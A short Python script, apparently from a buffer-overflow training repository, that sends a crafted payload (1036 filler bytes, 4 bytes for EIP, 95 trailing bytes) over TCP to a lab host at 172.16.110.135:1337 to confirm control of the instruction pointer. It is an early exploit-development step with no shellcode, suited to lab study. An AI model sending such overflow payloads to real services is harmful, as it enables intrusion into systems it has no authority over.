import socket
import sys

#
# Copyright (C) 2022  Dale Furneaux (opinfosec)
# Released under GNU GPL v2
# Eip Test Confirmation of Control of EIP
# https://github.com/opsec-infosec/BufferOverflow
#

# ASCII:
# A = 41
# X = 58
# E = 45


filler = "A" * 1036
eip = "X" * 4 # 4 bytes for EIP
extend = "E" * 95
try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.16.110.135", 1337))
    buffer = filler + eip + extend
    s.send(buffer.encode("latin-1"))
    s.close()

except Exception as ex:
    print ("Error: ", ex)
    sys.exit(1)

sys.exit(0)
